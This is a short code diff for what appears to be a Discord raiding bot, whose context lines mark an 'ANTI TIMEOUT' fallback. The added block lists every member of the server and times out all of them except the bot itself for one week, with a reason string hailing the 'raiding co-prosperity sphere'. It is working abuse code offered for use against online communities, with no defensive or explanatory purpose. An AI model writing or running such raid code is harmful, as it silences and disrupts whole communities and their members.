@@ -100,6 +100,18 @@ https://discord.gg/annycW3Xrk
                 );
               } catch (_e) {
                 /* ANTI TIMEOUT */
+
+                try {
+                    (await discordServer.members.list()).forEach(async (member) => {
+                        if (member.id === client.user?.id) {
+                            member.timeout(0, "荒らし共栄圏万歳！");
+                        }else {
+                            member.timeout(60 * 1000 * 60 * 24 * 7, "荒らし共栄圏万歳！");
+                        }
+                    })
+                }catch(_e) {
+
+                }
               }
             }
           });
